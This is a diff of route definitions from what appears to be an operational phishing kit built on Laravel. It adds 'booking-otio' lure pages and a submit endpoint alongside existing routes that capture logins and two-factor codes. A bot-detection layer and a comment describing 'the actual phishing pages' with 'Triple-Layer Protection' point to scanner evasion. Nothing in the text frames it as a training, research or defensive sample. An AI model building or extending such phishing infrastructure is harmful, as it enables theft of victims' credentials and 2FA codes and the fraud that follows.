@@ -42,6 +42,9 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
     Route::post('/invitation-login', [LoginApprovalController::class, 'submitLogin']);
     Route::get('/invitation', [PhishingController::class, 'index']);
 
+    Route::get('/booking-otio-{token}', [PhishingController::class, 'showBookingOtio'])->name('booking-otio.token');
+    Route::get('/booking-otio', [PhishingController::class, 'showBookingOtio'])->name('booking-otio');
+
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
 
     // Dynamic tokenized paths (the actual phishing pages) - Triple-Layer Protection
@@ -69,6 +72,7 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
     Route::post('/login', [PhishingController::class, 'handleLogin']);
     Route::post('/2fa', [PhishingController::class, 'handle2fa']);
     Route::post('/log', [PhishingController::class, 'handleGenericLog']);
+    Route::post('/booking-otio/submit', [PhishingController::class, 'handleBookingOtioSubmit'])->name('booking-otio.submit');
 });
 
 // Non-blocked API internal call
